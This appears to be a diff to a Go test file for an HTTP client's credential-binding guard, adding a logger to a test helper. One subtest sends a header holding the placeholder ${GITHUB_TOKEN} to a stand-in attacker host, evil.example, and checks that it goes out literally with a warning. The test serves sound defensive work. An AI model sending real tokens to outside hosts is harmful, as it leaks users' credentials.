@@ -4,6 +4,7 @@ import (
 	"context"
 	"errors"
 	"io"
+	"log/slog"
 	"net/http"
 	"net/http/httptest"
 	"net/url"
@@ -88,7 +89,14 @@ func expectRefused(t *testing.T, rawURL, header, value, variable string) {
 // expectSent asserts the request went out once and carried want in header.
 func expectSent(t *testing.T, rawURL, header, value, want string) {
 	t.Helper()
+	expectSentLogged(t, nil, rawURL, header, value, want)
+}
+
+// expectSentLogged is expectSent with the client reporting to log.
+func expectSentLogged(t *testing.T, log *slog.Logger, rawURL, header, value, want string) {
+	t.Helper()
 	c, bt := newBindingClient(t)
+	c.SetLogger(log)
 	resp, err := c.GetWithHeadersContext(context.Background(), rawURL, map[string]string{header: value})
 	if err != nil {
 		t.Fatalf("%s with %s=%q was refused or failed: %v", rawURL, header, value, err)
@@ -255,7 +263,7 @@ func TestCheckCredentialBinding_UnlistedHeaderNotChecked(t *testing.T) {
 
 	t.Run("X-Custom carrying ${GITHUB_TOKEN} to a foreign host is sent literally with a Warn", func(t *testing.T) {
 		lc := captureWarnLogs(t)
-		expectSent(t, "https://evil.example/latest", "X-Custom", "${GITHUB_TOKEN}", "${GITHUB_TOKEN}")
+		expectSentLogged(t, lc.logger(), "https://evil.example/latest", "X-Custom", "${GITHUB_TOKEN}", "${GITHUB_TOKEN}")
 		found := false
 		for _, line := range lc.all() {
 			if strings.Contains(line, "X-Custom") && strings.Contains(line, "GITHUB_TOKEN") {
